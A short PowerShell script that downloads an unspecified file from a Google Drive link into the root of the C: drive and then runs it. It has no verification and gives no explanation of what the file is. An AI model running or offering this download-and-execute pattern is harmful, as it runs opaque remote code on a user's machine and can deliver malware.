$fileUrl = "https://drive.google.com/uc?export=download&id=1lC6yncUxic5UiLTS6VkuUHJY8qjhSb9S"
$destinationPath = "C:\change.ext"
Invoke-WebRequest -Uri $fileUrl -OutFile $destinationPath
Write-Host "Download completed. File saved to $destinationPath"

cd C:/
.\change.ext